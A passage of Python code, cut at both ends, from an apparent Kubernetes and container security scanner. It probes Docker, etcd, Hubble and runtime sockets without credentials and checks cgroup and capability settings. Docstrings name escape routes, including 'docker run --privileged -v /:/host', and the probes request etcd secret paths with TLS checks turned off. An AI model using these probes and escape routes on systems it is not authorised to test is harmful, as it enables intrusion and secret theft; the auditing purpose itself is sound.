                         f'can connect and issue containerd gRPC commands '
                         f'(container create, exec, snapshot import)'),
            'host':     host,
            'port':     0,
        })

    # ------------------------------------------------------------------
    # 4. Docker-compatible TCP API on port 2376
    # ------------------------------------------------------------------
    status3, body3 = _http_get(host, 2376, '/v1.41/containers/json')
    if status3 == 200 and isinstance(body3, list):
        findings.append({
            'severity': 'CRITICAL',
            'title':    'DOCKER_API_UNAUTH_2376',
            'detail':   (f'host={host}:2376 GET /v1.41/containers/json returned 200 '
                         f'— {len(body3)} container(s) listed; Docker/containerd shim '
                         f'TCP API exposed without TLS or auth'),
            'host':     host,
            'port':     2376,
        })

    # ------------------------------------------------------------------
    # 5. CRI-O Unix socket world-writable
    # ------------------------------------------------------------------
    crio_sock = '/run/crio/crio.sock'
    if _is_world_writable(crio_sock):
        findings.append({
            'severity': 'CRITICAL',
            'title':    'CRIO_SOCKET_WRITABLE',
            'detail':   (f'{crio_sock} is world-writable — CRI-O OCI runtime socket '
                         f'accessible to unprivileged local users; '
                         f'container lifecycle and exec-into-container available'),
            'host':     host,
            'port':     0,
        })

    return findings


# ---------------------------------------------------------------------------
# cgroup escape surface
# ---------------------------------------------------------------------------

def check_cgroup_escape_surface(pid: int = None) -> list:
    """
    Examine the local cgroup hierarchy for container escape surface.

    Sources:
    - Kubernetes ch02 (creating-and-running-containers): cgroups enforce
      resource limits (CPU, memory, devices) that define the isolation
      boundary between containers and the host kernel.
    - Kubernetes ch19 (securing-applications-in-kubernetes): privileged
      containers receive 'a *:* rwm' in devices.list and full CapEff, making
      them functionally equivalent to root on the host.
    - Linux cgroup v1 semantics: memory.limit_in_bytes == 9223372036854771712
      means no limit enforced; cpu.shares == 1024 is the default (no
      dedicated allocation); devices.list 'a *:* rwm' grants all device nodes.

    Checks performed (reads /proc and /sys — no writes, no network):
      1. /proc/1/cgroup: detect docker/k8s cgroup namespace -> INFO
      2. /sys/fs/cgroup/memory/memory.limit_in_bytes: unlimited -> HIGH
      3. /sys/fs/cgroup/cpu/cpu.shares: default 1024 -> MEDIUM
      4. /sys/fs/cgroup/devices/devices.list: 'a *:* rwm' -> CRITICAL
      5. /proc/self/status CapEff: >= 0x1fffffffff -> CRITICAL

    pid param: reserved for future per-process cgroup path resolution;
    currently unused (all checks target /proc/self or /proc/1).

    Returns list of {severity, title, detail, host, port}.
    host/port are empty strings/0 for local checks.
    """
    findings = []

    def _read_file(path: str) -> str:
        """Return file contents as stripped string, or '' on any error."""
        try:
            with open(path, 'r', errors='replace') as fh:
                return fh.read().strip()
        except Exception:
            return ''

    # ------------------------------------------------------------------
    # 1. /proc/1/cgroup — detect container namespace
    # ------------------------------------------------------------------
    cgroup_content = _read_file('/proc/1/cgroup')
    if cgroup_content:
        container_indicators = ('docker', 'kubepods', 'containerd', 'crio',
                                'lxc', 'machine.slice')
        matched = [tok for tok in container_indicators
                   if tok in cgroup_content]
        if matched:
            findings.append({
                'severity': 'INFO',
                'title':    'RUNNING_IN_CONTAINER',
                'detail':   (f'/proc/1/cgroup hierarchy contains container '
                             f'namespace marker(s): {matched} — '
                             f'process is inside a container; '
                             f'subsequent cgroup findings apply to container scope'),
                'host':     '',
                'port':     0,
            })

    # ------------------------------------------------------------------
    # 2. memory.limit_in_bytes — unlimited cgroup memory
    # ------------------------------------------------------------------
    mem_limit_raw = _read_file('/sys/fs/cgroup/memory/memory.limit_in_bytes')
    if mem_limit_raw:
        try:
            mem_limit = int(mem_limit_raw)
            # 9223372036854771712 == PAGE_COUNTER_MAX on most kernels
            # (max long - 4095); values >= this indicate no enforced limit
            if mem_limit >= 9223372036854771712:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'UNLIMITED_MEMORY_CGROUP — resource escape',
                    'detail':   (f'memory.limit_in_bytes={mem_limit} '
                                 f'(PAGE_COUNTER_MAX / no limit enforced) — '
                                 f'container can consume host memory without '
                                 f'cgroup-enforced ceiling; OOM affects host'),
                    'host':     '',
                    'port':     0,
                })
        except ValueError:
            pass

    # ------------------------------------------------------------------
    # 3. cpu.shares — default (untuned) CPU allocation
    # ------------------------------------------------------------------
    cpu_shares_raw = _read_file('/sys/fs/cgroup/cpu/cpu.shares')
    if cpu_shares_raw:
        try:
            cpu_shares = int(cpu_shares_raw)
            if cpu_shares == 1024:
                findings.append({
                    'severity': 'MEDIUM',
                    'title':    'DEFAULT_CPU_SHARES',
                    'detail':   (f'cpu.shares=1024 (kernel default) — '
                                 f'no dedicated CPU allocation enforced; '
                                 f'container competes equally with host processes '
                                 f'under contention; workload isolation absent'),
                    'host':     '',
                    'port':     0,
                })
        except ValueError:
            pass

    # ------------------------------------------------------------------
    # 4. devices.list — all-devices permission (privileged container)
    # ------------------------------------------------------------------
    devices_raw = _read_file('/sys/fs/cgroup/devices/devices.list')
    if devices_raw:
        # 'a *:* rwm' on a single line = all-allow policy
        lines = [ln.strip() for ln in devices_raw.splitlines()]
        if any(ln == 'a *:* rwm' for ln in lines):
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ALL_DEVICES_ALLOWED — privileged container',
                'detail':   ("devices.list contains 'a *:* rwm' — "
                             "all device nodes accessible with read/write/mknod; "
                             "equivalent to --privileged; host disk/mem/netdev "
                             "accessible from inside the container"),
                'host':     '',
                'port':     0,
            })

    # ------------------------------------------------------------------
    # 5. /proc/self/status CapEff — full capability set
    # ------------------------------------------------------------------
    status_raw = _read_file('/proc/self/status')
    if status_raw:
        cap_eff = None
        for line in status_raw.splitlines():
            if line.startswith('CapEff:'):
                parts = line.split()
                if len(parts) >= 2:
                    try:
                        cap_eff = int(parts[1], 16)
                    except ValueError:
                        pass
                break
        if cap_eff is not None and cap_eff >= 0x0000001fffffffff:
            findings.append({
                'severity': 'CRITICAL',
                'title':    'FULL_CAPABILITIES — privileged or escape possible',
                'detail':   (f'CapEff=0x{cap_eff:016x} >= 0x0000001fffffffff '
                             f'— process holds full Linux capability set '
                             f'(CAP_SYS_ADMIN, CAP_NET_ADMIN, CAP_DAC_OVERRIDE, etc.); '
                             f'host namespace breakout likely via /proc/sysrq-trigger, '
                             f'nsenter, or cgroup mount tricks'),
                'host':     '',
                'port':     0,
            })

    return findings


def check_seccomp_profile_gaps(host: str, port: int = 8001,
                                timeout: float = 5.0) -> list:
    """
    Probe the Kubernetes API server for missing or permissive seccomp profiles.

    Sources:
    - Kubernetes in Action 2e ch02 (containers): seccomp (Secure Computing Mode)
      filters individual syscalls via a JSON allowlist. Without it, containers
      have access to the full host kernel syscall surface — kernel exploits like
      Dirty COW (CVE-2016-5195) and Dirty Pipe (CVE-2022-0847) require only a
      handful of syscalls to escalate privilege from container to host.
    - K8s securityContext.seccompProfile.type values: RuntimeDefault (Docker/
      containerd default filter, ~350 syscalls allowed), Localhost (custom
      profile from node), Unconfined (no filter — full syscall access).
    - Pods with seccompProfile.type absent or Unconfined can call ptrace,
      unshare, clone(CLONE_NEWUSER), and mount — the standard namespace-escape
      chain. RuntimeDefault drops all three high-risk categories.
    - allowPrivilegeEscalation=true (or omitted, which defaults to true when
      the container runs as root) allows setuid/setgid binaries inside the
      container to gain capabilities not in the original set — trivial escalation
      if any setuid binary exists in the image layers.
    - capabilities.add SYS_ADMIN: grants mount, ptrace, BPF prog load, perf_event
      — collectively sufficient for container breakout via cgroup escape or eBPF
      backdoor. NET_ADMIN: raw socket creation, iptables manipulation, ARP/ICMP
      spoofing across the pod network.

    Checks performed (stdlib only, unauthenticated):
      1. GET /api/v1/pods — seccompProfile absent or Unconfined -> HIGH
      2. Null securityContext pod count                          -> CRITICAL
      3. allowPrivilegeEscalation=true                          -> HIGH
      4. capabilities.add contains SYS_ADMIN or NET_ADMIN       -> CRITICAL

    Returns list of {severity, title, detail, host, port}.
    """
    import ssl

    findings = []

    def _https_get(path: str):
        """Return (status_code, parsed_json_or_None). Skips TLS verification."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        for scheme in ('https', 'http'):
            url = f'{scheme}://{host}:{port}{path}'
            try:
                req = urllib.request.Request(url, method='GET')
                req.add_header('Accept', 'application/json')
                with urllib.request.urlopen(req, timeout=timeout,
                                            context=ctx if scheme == 'https'
                                            else None) as r:
                    raw = r.read()
                    try:
                        return r.getcode(), json.loads(raw)
                    except Exception:
                        return r.getcode(), None
            except urllib.error.HTTPError as e:
                return e.code, None
            except Exception:
                continue
        return 0, None

    status, body = _https_get('/api/v1/pods')
    if status != 200 or not isinstance(body, dict):
        return findings

    items = body.get('items', [])
    if not isinstance(items, list):
        return findings

    null_ctx_count     = 0
    no_seccomp_pods    = []
    priv_esc_pods      = []
    dangerous_cap_pods = []
    dangerous_caps     = {'SYS_ADMIN', 'NET_ADMIN'}

    for pod in items:
        meta       = pod.get('metadata', {}) or {}
        pod_name   = meta.get('name', '<unknown>')
        namespace  = meta.get('namespace', '<unknown>')
        label      = f'{namespace}/{pod_name}'
        spec       = pod.get('spec', {}) or {}
        pod_sc     = spec.get('securityContext') or {}

        containers = spec.get('containers', []) or []
        init_ctrs  = spec.get('initContainers', []) or []

        for ctr in containers + init_ctrs:
            ctr_name = ctr.get('name', '<unknown>')
            sc       = ctr.get('securityContext')

            if sc is None:
                null_ctx_count += 1
                continue

            # seccomp profile check (container-level overrides pod-level)
            ctr_seccomp  = sc.get('seccompProfile') or pod_sc.get('seccompProfile')
            if ctr_seccomp is None:
                no_seccomp_pods.append(f'{label}/{ctr_name}')
            else:
                profile_type = ctr_seccomp.get('type', '')
                if profile_type not in ('RuntimeDefault', 'Localhost'):
                    no_seccomp_pods.append(f'{label}/{ctr_name}')

            # allowPrivilegeEscalation
            if sc.get('allowPrivilegeEscalation') is True:
                priv_esc_pods.append(f'{label}/{ctr_name}')

            # dangerous capabilities
            caps_add = (sc.get('capabilities') or {}).get('add', []) or []
            hits     = dangerous_caps.intersection(set(caps_add))
            if hits:
                dangerous_cap_pods.append(
                    f'{label}/{ctr_name} caps={sorted(hits)}')

    if null_ctx_count:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'NULL_SECURITY_CONTEXT',
            'detail':   (f'{null_ctx_count} container(s) have no securityContext — '
                         f'no seccomp filter, no capability drop, no privilege '
                         f'escalation restriction; full kernel syscall surface exposed '
                         f'(ptrace, unshare, mount, perf_event_open reachable)'),
            'host':     host,
            'port':     port,
        })

    if no_seccomp_pods:
        sample = no_seccomp_pods[:5]
        findings.append({
            'severity': 'HIGH',
            'title':    'NO_SECCOMP_PROFILE',
            'detail':   (f'{len(no_seccomp_pods)} container(s) run with unrestricted '
                         f'syscall access (seccompProfile absent or Unconfined); '
                         f'sample: {sample}; kernel exploit surface includes '
                         f'ptrace/clone/unshare/BPF — RuntimeDefault drops these'),
            'host':     host,
            'port':     port,
        })

    if priv_esc_pods:
        sample = priv_esc_pods[:5]
        findings.append({
            'severity': 'HIGH',
            'title':    'PRIVILEGE_ESCALATION_ALLOWED',
            'detail':   (f'{len(priv_esc_pods)} container(s) have '
                         f'allowPrivilegeEscalation=true; setuid/setgid binaries '
                         f'inside the container can gain capabilities beyond the '
                         f'original set; sample: {sample}'),
            'host':     host,
            'port':     port,
        })

    if dangerous_cap_pods:
        sample = dangerous_cap_pods[:5]
        findings.append({
            'severity': 'CRITICAL',
            'title':    'DANGEROUS_CAPABILITIES',
            'detail':   (f'{len(dangerous_cap_pods)} container(s) granted '
                         f'SYS_ADMIN or NET_ADMIN; SYS_ADMIN enables mount/ptrace/'
                         f'BPF/cgroup escape; NET_ADMIN enables raw socket creation/'
                         f'iptables manipulation/ARP spoofing; sample: {sample}'),
            'host':     host,
            'port':     port,
        })

    return findings


def check_namespace_isolation(host: str, port: int = 8001,
                               timeout: float = 5.0) -> list:
    """
    Probe the Kubernetes API for workload namespace isolation gaps.

    Sources:
    - Kubernetes in Action 2e ch07 (namespaces and labels): Kubernetes namespaces
      partition cluster resources into logical scopes. A cluster with only the
      default namespace means all workloads — user applications, monitoring stacks,
      CI runners — share the same RBAC and network blast radius. Namespace
      separation is the first line of workload isolation; it gates network policy,
      RBAC, and resource quota enforcement.
    - K8s namespaces are NOT a security boundary by themselves — they are a
      scoping mechanism. The security boundary is the combination of namespace
      isolation + NetworkPolicy enforcement + RBAC role binding. Without all
      three, namespace separation is cosmetic.
    - kube-system namespace privilege: pods scheduled here run with elevated
      cluster-level RBAC bindings. Non-system workloads landing in kube-system
      inherit those bindings, effectively elevating arbitrary application pods
      to cluster-admin adjacency without any explicit RBAC grant.
    - NetworkPolicy absence: pods in different namespaces can communicate freely
      on the pod network (default deny-none posture). An attacker with a foothold
      in any pod can reach every other pod IP without crossing a policy boundary —
      lateral movement is unrestricted.
    - Namespaces that have no NetworkPolicy objects leave their pods reachable
      from any other pod in the cluster regardless of namespace boundaries.

    Checks performed (stdlib only, unauthenticated):
      1. GET /api/v1/namespaces — single namespace (only default) -> MEDIUM
      2. GET /api/v1/namespaces/kube-system/pods — non-system workloads -> HIGH
      3. GET /apis/networking.k8s.io/v1/networkpolicies — no objects -> HIGH
      4. Per-namespace network policy coverage gap                -> MEDIUM

    Returns list of {severity, title, detail, host, port}.
    """
    import ssl

    findings = []

    # Known kube-system component name prefixes (DaemonSet/Deployment names
    # that ship with a standard cluster — not exhaustive but covers kubeadm,
    # kops, GKE, EKS, AKS control-plane pods)
    SYSTEM_POD_PREFIXES = (
        'kube-apiserver', 'kube-controller', 'kube-scheduler',
        'kube-proxy', 'etcd', 'coredns', 'core-dns',
        'metrics-server', 'aws-node', 'kube-flannel',
        'calico', 'cilium', 'weave', 'canal',
        'cloud-controller', 'csi-', 'storage-provisioner',
    )

    def _https_get(path: str):
        """Return (status_code, parsed_json_or_None). Skips TLS verification."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        for scheme in ('https', 'http'):
            url = f'{scheme}://{host}:{port}{path}'
            try:
                req = urllib.request.Request(url, method='GET')
                req.add_header('Accept', 'application/json')
                with urllib.request.urlopen(req, timeout=timeout,
                                            context=ctx if scheme == 'https'
                                            else None) as r:
                    raw = r.read()
                    try:
                        return r.getcode(), json.loads(raw)
                    except Exception:
                        return r.getcode(), None
            except urllib.error.HTTPError as e:
                return e.code, None
            except Exception:
                continue
        return 0, None

    # ------------------------------------------------------------------
    # 1. Namespace count — single-namespace cluster
    # ------------------------------------------------------------------
    ns_status, ns_body = _https_get('/api/v1/namespaces')
    if ns_status != 200 or not isinstance(ns_body, dict):
        return findings

    ns_items = ns_body.get('items', []) or []
    ns_names = [
        (n.get('metadata') or {}).get('name', '')
        for n in ns_items
        if isinstance(n, dict)
    ]
    ns_names = [n for n in ns_names if n]

    if len(ns_names) == 1:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'SINGLE_NAMESPACE',
            'detail':   ('Only the default namespace exists — no workload isolation; '
                         'all pods share the same network blast radius and RBAC scope; '
                         'namespace separation + NetworkPolicy are required for '
                         'effective multi-tenant isolation'),
            'host':     host,
            'port':     port,
        })

    # ------------------------------------------------------------------
    # 2. Non-system workloads in kube-system
    # ------------------------------------------------------------------
    ks_status, ks_body = _https_get('/api/v1/namespaces/kube-system/pods')
    if ks_status == 200 and isinstance(ks_body, dict):
        ks_pods = ks_body.get('items', []) or []
        non_system = []
        for pod in ks_pods:
            name = (pod.get('metadata') or {}).get('name', '')
            if not any(name.startswith(p) for p in SYSTEM_POD_PREFIXES):
                non_system.append(name)
        if non_system:
            findings.append({
                'severity': 'HIGH',
                'title':    'WORKLOADS_IN_KUBE_SYSTEM',
                'detail':   (f'{len(non_system)} non-system workload(s) running in '
                             f'kube-system namespace; pods here inherit elevated '
                             f'cluster-level RBAC bindings without explicit grants; '
                             f'pods: {non_system[:8]}'),
                'host':     host,
                'port':     port,
            })

    # ------------------------------------------------------------------
    # 3 & 4. NetworkPolicy coverage
    # ------------------------------------------------------------------
    np_status, np_body = _https_get('/apis/networking.k8s.io/v1/networkpolicies')
    if np_status == 200 and isinstance(np_body, dict):
        np_items  = np_body.get('items', []) or []
        if not np_items:
            findings.append({
                'severity': 'HIGH',
                'title':    'NO_NETWORK_POLICIES',
                'detail':   ('Zero NetworkPolicy objects found cluster-wide; '
                             'pods can communicate freely across all namespaces '
                             'on the pod network (default deny-none posture); '
                             'lateral movement from any compromised pod is '
                             'unrestricted'),
                'host':     host,
                'port':     port,
            })
        else:
            # Determine which namespaces have at least one NetworkPolicy
            covered_ns = set()
            for np in np_items:
                np_ns = (np.get('metadata') or {}).get('namespace', '')
                if np_ns:
                    covered_ns.add(np_ns)

            uncovered = [n for n in ns_names if n not in covered_ns
                         and n != 'kube-node-lease']
            if uncovered:
                findings.append({
                    'severity': 'MEDIUM',
                    'title':    'NAMESPACE_NO_NETPOL',
                    'detail':   (f'{len(uncovered)} namespace(s) have no NetworkPolicy '
                                 f'— pods reachable from any other pod regardless of '
                                 f'namespace boundaries: {uncovered[:10]}'),
                    'host':     host,
                    'port':     port,
                })

    return findings


# ---------------------------------------------------------------------------
# etcd direct access
# ---------------------------------------------------------------------------

def probe_etcd_exposure(host: str, port: int = 2379, timeout: float = 10.0) -> list:
    """Probe etcd HTTP API for unauthenticated access to the Kubernetes secret store."""
    import urllib.request
    import urllib.error

    findings: list = []
    base = f'http://{host}:{port}'

    def _get(path: str):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers={'User-Agent': 'etcd-probe/1.0'})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, r.read(4096)
        except urllib.error.HTTPError as e:
            return e.code, b''
        except Exception:
            return None, b''

    # 1. Liveness / health
    status, body = _get('/health')
    if status == 200:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ETCD_UNAUTH',
            'detail':   ('ETCD_UNAUTH — etcd cluster directly accessible without '
                         'TLS/auth (Kubernetes secret store)'),
            'host':     host,
            'port':     port,
        })

    # 2. Key listing — v3 then v2
    for path in ('/v3/keys', '/v2/keys'):
        status, body = _get(path)
        if status == 200 and body:
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ETCD_KEYS_UNAUTH',
                'detail':   ('ETCD_KEYS_UNAUTH — etcd key space enumerable '
                             '(Kubernetes secrets accessible)'),
                'host':     host,
                'port':     port,
            })
            break

    # 3. Kubernetes secrets path
    status, body = _get('/v2/keys/registry/secrets')
    if status == 200 and body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ETCD_K8S_SECRETS_UNAUTH',
            'detail':   ('ETCD_K8S_SECRETS_UNAUTH — Kubernetes secrets readable '
                         'directly from etcd'),
            'host':     host,
            'port':     port,
        })

    # 4. Service accounts path
    status, body = _get('/v2/keys/registry/serviceaccounts')
    if status == 200 and body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ETCD_SERVICE_ACCOUNTS_UNAUTH',
            'detail':   ('ETCD_SERVICE_ACCOUNTS_UNAUTH — Kubernetes service accounts '
                         'readable from etcd'),
            'host':     host,
            'port':     port,
        })

    return findings


# ---------------------------------------------------------------------------
# Cilium / Hubble CNI security gaps
# ---------------------------------------------------------------------------

def probe_cilium_hubble(host: str, port: int = 4244, timeout: float = 10.0) -> list:
    """Probe Cilium Hubble and CNI metric surfaces for unauthenticated access."""
    import socket
    import urllib.request
    import urllib.error

    findings: list = []

    def _tcp_open(h: str, p: int) -> bool:
        try:
            s = socket.create_connection((h, p), timeout=timeout)
            s.close()
            return True
        except Exception:
            return False

    def _http_get(p: int, path: str):
        url = f'http://{host}:{p}{path}'
        req = urllib.request.Request(url, headers={'User-Agent': 'hubble-probe/1.0'})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, r.read(4096)
        except urllib.error.HTTPError as e:
            return e.code, b''
        except Exception:
            return None, b''

    # 1. Hubble peer service — port 4244 (gRPC, TCP reachability only)
    if _tcp_open(host, 4244):
        findings.append({
            'severity': 'HIGH',
            'title':    'HUBBLE_PEER_UNAUTH',
            'detail':   ('HUBBLE_PEER_UNAUTH — Cilium Hubble peer service accessible'),
            'host':     host,
            'port':     4244,
        })

    # 2. Hubble flows API — port 4245
    status, body = _http_get(4245, '/api/v1/flows')
    if status == 200 and body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'HUBBLE_FLOWS_UNAUTH',
            'detail':   ('HUBBLE_FLOWS_UNAUTH — network flow data readable without auth '
                         '(complete E-W traffic visibility)'),
            'host':     host,
            'port':     4245,
        })

    # 3. Hubble relay — port 4246
    status, body = _http_get(4246, '/api/v1/namespaces')
    if status == 200 and body:
        findings.append({
            'severity': 'HIGH',
            'title':    'HUBBLE_RELAY_UNAUTH',
            'detail':   ('HUBBLE_RELAY_UNAUTH — Hubble relay accessible '
                         '(cross-cluster flow data)'),
            'host':     host,
            'port':     4246,
        })

    # 4. Cilium metrics (Prometheus) — port 9962
    if _tcp_open(host, 9962):
        findings.append({
            'severity': 'MEDIUM',
            'title':    'CILIUM_METRICS_EXPOSED',
            'detail':   ('CILIUM_METRICS_EXPOSED — Cilium network policy metrics accessible'),
            'host':     host,
            'port':     9962,
        })

    return findings


# ---------------------------------------------------------------------------
# Container runtime socket exposure
# ---------------------------------------------------------------------------
def check_container_runtime_socket(host: str = 'localhost', port: int = 0,
                                    timeout: float = 5.0) -> list:
    """Detect exposed container runtime sockets — critical container escape vectors.

    Checks Unix-domain sockets (Docker, containerd, Podman, CRI-O) for existence
    and write access, probes Docker daemon liveness via the Engine API, and tests
    Docker's TCP API (port 2375/2376) for unauthenticated remote access.

    Container runtime socket exposure is the highest-severity container escape
    primitive: write access to /var/run/docker.sock from inside a container
    grants full root on the host via 'docker run --privileged -v /:/host'.
    (Kubernetes in Action 2e, ch.2: container isolation uses namespaces and
    cgroups but shared kernel — socket access bypasses all isolation.)
    """
    findings: list = []
    _h = host or 'localhost'
    _p = port or 0

    # ------------------------------------------------------------------
    # 1. Docker Unix socket
    # ------------------------------------------------------------------
    docker_sock = '/var/run/docker.sock'
    if os.path.exists(docker_sock):
        findings.append({
            'severity': 'CRITICAL',
            'title':    'DOCKER_SOCKET_PRESENT',
            'detail':   ('DOCKER_SOCKET_PRESENT — Docker daemon socket exists at '
                         f'{docker_sock}; if mounted into a container this is a '
                         'full-privilege container escape vector'),
            'host':     _h,
            'port':     _p,
        })
        try:
            mode = os.stat(docker_sock).st_mode
            if mode & 0o002:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'DOCKER_SOCKET_WORLD_WRITABLE',
                    'detail':   (f'DOCKER_SOCKET_WORLD_WRITABLE — {docker_sock} is '
                                 'world-writable (permission bits include o+w); any '
                                 'local process can reach the daemon without group '
                                 'membership'),
                    'host':     _h,
                    'port':     _p,
                })
        except OSError:
            pass

        if os.access(docker_sock, os.W_OK):
            findings.append({
                'severity': 'CRITICAL',
                'title':    'DOCKER_SOCKET_WRITABLE',
                'detail':   (f'DOCKER_SOCKET_WRITABLE — current process has write '
                             f'access to {docker_sock}'),
                'host':     _h,
                'port':     _p,
            })
            # Probe liveness via raw HTTP over the Unix domain socket
            try:
                _s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                _s.settimeout(timeout)
                _s.connect(docker_sock)
                _s.sendall(b'GET /v1.41/info HTTP/1.0\r\nHost: localhost\r\n\r\n')
                resp = b''
                while True:
                    chunk = _s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) > 65536:
                        break
                _s.close()
                if b'200 OK' in resp and (b'ServerVersion' in resp or
                                          b'KernelVersion' in resp):
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'DOCKER_DAEMON_ACCESSIBLE',
                        'detail':   ('DOCKER_DAEMON_ACCESSIBLE — Docker daemon '
                                     'responds to GET /v1.41/info via Unix socket; '
                                     'full container lifecycle control available '
                                     'to current user (spawn privileged container, '
                                     'mount host /, escalate to root)'),
                        'host':     _h,
                        'port':     _p,
                    })
            except Exception:
                pass

    # ------------------------------------------------------------------
    # 2. containerd Unix socket
    # ------------------------------------------------------------------
    containerd_sock = '/run/containerd/containerd.sock'
    if os.path.exists(containerd_sock) and os.access(containerd_sock, os.W_OK):
        findings.append({
            'severity': 'CRITICAL',
            'title':    'CONTAINERD_SOCKET_WRITABLE',
            'detail':   (f'CONTAINERD_SOCKET_WRITABLE — containerd daemon socket '
                         f'{containerd_sock} is writable; full container lifecycle '
                         'control via containerd shim API without Docker'),
            'host':     _h,
            'port':     _p,
        })

    # ------------------------------------------------------------------
    # 3. Podman Unix sockets (root + rootless)
    # ------------------------------------------------------------------
    uid = os.getuid()
    podman_candidates = [
        f'/run/user/{uid}/podman/podman.sock',
        '/run/podman/podman.sock',
    ]
    for ps in podman_candidates:
        if os.path.exists(ps) and os.access(ps, os.W_OK):
            findings.append({
                'severity': 'HIGH',
                'title':    'PODMAN_SOCKET_WRITABLE',
                'detail':   (f'PODMAN_SOCKET_WRITABLE — Podman socket {ps} is '
                             'writable; rootless Podman escalation or container '
                             'escape depending on seccomp/AppArmor configuration'),
                'host':     _h,
                'port':     _p,
            })
            break  # report once

    # ------------------------------------------------------------------
    # 4. CRI-O Unix socket
    # ------------------------------------------------------------------
    crio_sock = '/var/run/crio/crio.sock'
    if os.path.exists(crio_sock) and os.access(crio_sock, os.W_OK):
        findings.append({
            'severity': 'HIGH',
            'title':    'CRIO_SOCKET_WRITABLE',
            'detail':   (f'CRIO_SOCKET_WRITABLE — CRI-O socket {crio_sock} is '
                         'writable; Kubernetes CRI interface accessible without '
                         'privilege (create/exec arbitrary containers)'),
            'host':     _h,
            'port':     _p,
        })

    # ------------------------------------------------------------------
    # 5. Docker TCP API — port 2375 (plaintext) and 2376 (TLS)
    # ------------------------------------------------------------------
    tcp_host = _h

    # 5a. Port 2375 — unauthenticated plaintext Docker API
    try:
        _ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _ts.settimeout(timeout)
        _ts.connect((tcp_host, 2375))
        _ts.close()
        findings.append({
            'severity': 'CRITICAL',
            'title':    'DOCKER_TCP_UNAUTH',
            'detail':   (f'DOCKER_TCP_UNAUTH — Docker daemon listening on '
                         f'{tcp_host}:2375 (plaintext, no authentication); '
                         'full remote container lifecycle control without '
                         'credentials over the network'),
            'host':     tcp_host,
            'port':     2375,
        })
        # 5b. Confirm with container enumeration
        try:
            url = f'http://{tcp_host}:2375/v1.41/containers/json?all=1'
            req = urllib.request.Request(
                url, headers={'User-Agent': 'runtime-probe/1.0'})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                if r.status == 200:
                    body = r.read(8192)
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'DOCKER_TCP_CONTAINERS_LISTED',
                        'detail':   (f'DOCKER_TCP_CONTAINERS_LISTED — '
                                     f'GET /v1.41/containers/json returned HTTP 200 '
                                     f'on {tcp_host}:2375; container inventory '
                                     f'readable without auth ({len(body)} bytes)'),
                        'host':     tcp_host,
                        'port':     2375,
                    })
        except Exception:
            pass
    except Exception:
        pass

    # 5c. Port 2376 — TLS Docker API
    try:
        _ts2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _ts2.settimeout(timeout)
        _ts2.connect((tcp_host, 2376))
        _ts2.close()
        findings.append({
            'severity': 'HIGH',
            'title':    'DOCKER_TLS_PORT_OPEN',
            'detail':   (f'DOCKER_TLS_PORT_OPEN — Docker TLS API port 2376 '
                         f'reachable on {tcp_host}; verify mutual TLS client '
                         'cert requirement — unauthenticated TLS is a CRITICAL '
                         'remote container escape'),
            'host':     tcp_host,
            'port':     2376,
        })
    except Exception:
        pass

    return findings


# ---------------------------------------------------------------------------
# Privileged pod / over-permissioned container indicators
# ---------------------------------------------------------------------------
def check_privileged_pod_indicators() -> list:
    """Detect indicators of running inside a privileged or over-permissioned pod.

    Reads /proc and local filesystem paths to surface container escape
    pre-conditions: full Linux capabilities, host namespace sharing, dangerous
    volume mounts, and over-privileged Kubernetes service accounts.

    Source: Kubernetes in Action 2e ch.5 (pod security context), ch.2
    (Linux namespaces and cgroups as the isolation boundary).
    All checks are local reads — no outbound network traffic except the
    optional K8S API RBAC check which uses environment-provided coordinates.
    """
    findings: list = []
    _host = 'localhost'
    _port = 0

    # ------------------------------------------------------------------
    # 1. Running-in-container indicators
    # ------------------------------------------------------------------
    if os.path.exists('/.dockerenv'):
        findings.append({
            'severity': 'INFO',
            'title':    'RUNNING_IN_CONTAINER',
            'detail':   ('RUNNING_IN_CONTAINER — /.dockerenv present; process '
                         'is running inside a Docker/OCI container environment'),
            'host':     _host,
            'port':     _port,
        })

    cgroup_path = '/proc/1/cgroup'
    if os.path.exists(cgroup_path):
        try:
            with open(cgroup_path, 'r', errors='replace') as _f:
                _cg = _f.read(4096)
            if 'docker' in _cg or 'containerd' in _cg or 'kubepods' in _cg:
                findings.append({
                    'severity': 'INFO',
                    'title':    'CONTAINER_CGROUP_DETECTED',
                    'detail':   ('CONTAINER_CGROUP_DETECTED — /proc/1/cgroup '
                                 'references a container runtime cgroup hierarchy '
                                 '(docker/containerd/kubepods); confirms container '
                                 'context'),
                    'host':     _host,
                    'port':     _port,
                })
        except OSError:
            pass

    # ------------------------------------------------------------------
    # 2. Privileged container — effective capability bitmask
    # ------------------------------------------------------------------
    status_path = '/proc/self/status'
    if os.path.exists(status_path):
        try:
            with open(status_path, 'r', errors='replace') as _f:
                _status = _f.read()
            _m = re.search(r'^CapEff:\s+([0-9a-fA-F]+)', _status, re.MULTILINE)
            if _m:
                cap_eff = int(_m.group(1), 16)
                if cap_eff == 0xffffffffffffffff:
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'PRIVILEGED_CONTAINER_FULL_CAPS',
                        'detail':   (f'PRIVILEGED_CONTAINER_FULL_CAPS — CapEff = '
                                     f'{_m.group(1)}; process holds ALL Linux '
                                     'capabilities (equivalent to privileged: true); '
